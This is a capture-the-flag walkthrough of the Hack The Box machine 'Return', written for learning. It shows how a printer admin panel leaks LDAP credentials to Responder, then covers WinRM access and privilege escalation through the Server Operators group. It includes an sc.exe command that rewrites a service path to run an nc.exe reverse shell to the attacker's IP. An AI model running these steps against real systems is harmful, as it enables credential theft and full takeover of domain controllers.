---
layout: post
title: Return
date: 2025-05-31 10:00:00 +0100
categories: [Walkthroughs]
tags: [htb, windows, active directory,LDAP privesc]
---
![alt text](https://labs.hackthebox.com/storage/avatars/defa149ea7e259a4709a03a5825e970d.png)

---

| Description    |  Info |
| --------- | ----------- |
| Platform    | Hack The box       |
| OS | Windows        |
| Difficulty | Easy        |
| Release Date | 27 Sep 2021        |
| Link to machine | [Return](https://app.hackthebox.com/machines/401)        |

# Highlights
Responder, LDAP, Services, Server Operator, Windows Privilege Escalation

---

# Open Ports Enumeration
Nmap scan:

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-19 19:13 GMT
Nmap scan report for return.htb (10.10.11.108)
Host is up (0.12s latency).
Not shown: 65510 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: HTB Printer Admin Panel
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-19 19:32:33Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=2/19%OT=53%CT=1%CU=39818%PV=Y%DS=2%DC=T%G=Y%TM=67B62DC
OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=O%TS=
OS:U)SEQ(SP=101%GCD=1%ISR=10D%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=105%GCD=1%ISR
OS:=10C%TI=RD%CI=I%II=I%TS=U)SEQ(SP=109%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S%T
OS:S=U)SEQ(SP=FD%GCD=1%ISR=10A%TI=RD%CI=I%II=I%TS=U)OPS(O1=M53ANW8NNS%O2=M5
OS:3ANW8NNS%O3=M53ANW8%O4=M53ANW8NNS%O5=M53ANW8NNS%O6=M53ANNS)WIN(W1=FFFF%W
OS:2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M53ANW
OS:8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y
OS:%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR
OS:%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF
OS:=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80
OS:%CD=Z)

Network Distance: 2 hops
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-02-19T19:33:42
|_  start_date: N/A
|_clock-skew: 18m34s

TRACEROUTE (using port 23/tcp)
HOP RTT      ADDRESS
1   56.62 ms 10.10.16.1
2   27.57 ms return.htb (10.10.11.108)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 108.52 seconds
```

From the open ports we see with the ```nmap``` scan, we know this is a domain controller, so we can add ```return.local``` to our ```/etc/hosts``` file.

We see an interesting ```http-title``` running on the ```IIS Server``` on port ```80```, which is worth exploring.

```bash
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: HTB Printer Admin Panel
```


# HTB Printer Admin Panel

Navigating to ```http://return.local:80/``` using our browser we get presented with the following ```Admin Panel```, and the ```settings``` option looks interesting.

![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/images/Return(HTB)/Return1.png?raw=true)

The ```Settings Page``` shows a ```printer``` service setup, including a ```password```.

We can start either ```Burp Suite``` or ```Caido``` to intercept the request to check the application's behaviour.

![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/images/Return(HTB)/Return2.png?raw=true)

# Caido 

Once Caido is setup to intercept the request, we change the ```Server Address``` from ```printer.return.local``` to the IP address of our attack machine and sent the request using the Replay function of Caido. 

The request now shows our IP, and the response returns a ```200``` code, which means the request has been accepted.
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/images/Return(HTB)/Return3.png?raw=true)

Having control over the ```Server Address``` field, might allow us to intercept the ```Password``` being send by the printing service by using ```Responder```.

# Clear Text Credentials 

Using the command ```sudo responder -I tun0 -dPv```, we launch ```Responder```, making sure the ```LDAP```option is turned ```ON```, because the service is using port ```389```.
The LDAP option should be on by default, if not, the option can be enabled by changing the config file, using the command ```sudo gedit /etc/responder/Responder.conf```, changing LDAP from OFF to ON.
After setting up ```Responder``` to act as a malicious LDAP server, we can send the request once again using Caido or Burp Suite, and will receive the credentials in plaintext.
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/images/Return(HTB)/Return4.png?raw=true)


# Users and Shares Enumeration

Since we now have valid credentials, we can enumerate ```SMB``` shares and ```users```, using ```netexec```.

```bash
netexec smb return.local -u svc-printer -p '**********' --shares
SMB         10.10.11.108    445    PRINTER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
SMB         10.10.11.108    445    PRINTER          [+] return.local\svc-printer:********** 
SMB         10.10.11.108    445    PRINTER          [*] Enumerated shares
SMB         10.10.11.108    445    PRINTER          Share           Permissions     Remark
SMB         10.10.11.108    445    PRINTER          -----           -----------     ------
SMB         10.10.11.108    445    PRINTER          ADMIN$          READ            Remote Admin
SMB         10.10.11.108    445    PRINTER          C$              READ,WRITE      Default share
SMB         10.10.11.108    445    PRINTER          IPC$            READ            Remote IPC
SMB         10.10.11.108    445    PRINTER          NETLOGON        READ            Logon server share 
SMB         10.10.11.108    445    PRINTER          SYSVOL          READ            Logon server share
```

Nothing interesting with the shares enumeration, but we have ```read/write``` access to ```C$``` with the user ```svc-printer```


```bash
netexec smb return.local -u svc-printer -p '**********' --users 
SMB         10.10.11.108    445    PRINTER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
SMB         10.10.11.108    445    PRINTER          [+] return.local\svc-printer:********** 
SMB         10.10.11.108    445    PRINTER          -Username-                    -Last PW Set-       -BadPW- -Description-           
SMB         10.10.11.108    445    PRINTER          Administrator                 2021-07-16 15:03:22 0       Built-in account for administering the computer/domain                                                                                                        
SMB         10.10.11.108    445    PRINTER          Guest                         <never>             0       Built-in account for guest access to the computer/domain                                                                                                      
SMB         10.10.11.108    445    PRINTER          krbtgt                        2021-05-20 13:26:54 0       Key Distribution Center Service Account                                                                                                                       
SMB         10.10.11.108    445    PRINTER          svc-printer                   2021-05-26 08:15:13 0       Service Account for Printer                                                                                                                                   
SMB         10.10.11.108    445    PRINTER          [*] Enumerated 4 local users: RETURN

```


# Evil-WinRM shell

Since port ```5985``` is open, and nothing interesting came from the enumeration for the shares and users, we can attempt a shell using ```Evil-WinRM``` with the credentials we have, so we ca collect out ```user.txt``` flag.

```bash
evil-winrm -i return.local -u svc-printer -p '**********'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-printer\Documents> dir C:\Users\svc-printer\Desktop\


    Directory: C:\Users\svc-printer\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        5/31/2025   7:28 AM             34 user.txt

```

# Enumeration of svc-printer Groups and Privileges


```bash
*Evil-WinRM* PS C:\temp> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```
```Server Operators``` looks interesting.

```bash
*Evil-WinRM* PS C:\temp> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
```

```SeBackupPrivilege``` is a very permissive privilege, and we could use it to extract the ```SAM``` hashes present in the system.
I have attempted this path, but was unable to crack the SAM hash or use it to login as Administrator as the user is not part of the ```Remote Management Users```, so let's move on.

# Server Operators Group

The ```Server Operators``` group can chance the binary path of a service, let's check the running services on the machine

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> services

Path                                                                                                                 Privileges Service          
----                                                                                                                 ---------- -------          
C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS             
\??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{5533AFC7-64B3-4F6E-B453-E35320B35716}\MpKslDrv.sys       True MpKslceeb2796    
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                              True NetTcpPortSharing
C:\Windows\SysWow64\perfhost.exe                                                                                           True PerfHost         
"C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                                                False Sense            
C:\Windows\servicing\TrustedInstaller.exe                                                                                 False TrustedInstaller 
"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                                                     True VGAuthService    
"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                                                        True VMTools          
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\NisSrv.exe"                                             True WdNisSvc         
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\MsMpEng.exe"                                            True WinDefend        
"C:\Program Files\Windows Media Player\wmpnetwk.exe"                                                                      False WMPNetworkSvc 

```

# Privilege Escalation

Among the running services, we found ```vmtoolsd.exe``` which is used as a ```POC``` (proof of concept) for Privilege Escalation where the low-privileged user is part of the ```Server Operator``` group.

Link to the full article can be found [here](https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/#:~:text=This%20Server%20Operator%20exploit%20allows%20attackers%20to%20escalate,exploitation%20methods%2C%20lab%20configuration%2C%20and%20effective%20mitigation%20strategies.).

We can execute the same exploit as the guide shows:
* upload ```nc.exe```
* change the binary path of ```VMTools``` service
* ```stop``` the service on the victim machine
* start a ```nc listener``` on the attack machine
* start the ```service``` on the victim machine
* receive the ```reverse shell```

```bash
sc.exe config VMTools binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.16.7 4444" # set the path to where nc.exe is placed, then set your attacker IP and port where the nc listener has been started.
[SC] ChangeServiceConfig SUCCESS # Response from the command

sc.exe stop VMTools # stop the service
SERVICE_NAME: VMTools
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0 # confirmation of the service being stopped

sc.exe start VmTools # as soon as you start the service, your current shell will freeze and you should get a new shell on your nc listener

```

```bash
nc -lnvp 4444           
listening on [any] 4444 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.108] 58408
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>dir C:\Users\Administrator\Desktop
dir C:\Users\Administrator\Desktop
 Volume in drive C has no label.
 Volume Serial Number is 3A0C-428E

 Directory of C:\Users\Administrator\Desktop

09/27/2021  04:22 AM    <DIR>          .
09/27/2021  04:22 AM    <DIR>          ..
05/31/2025  07:28 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   8,834,842,624 bytes free

C:\Windows\system32>

```

Now you can collect your ```root.txt``` flag.

Enjoy!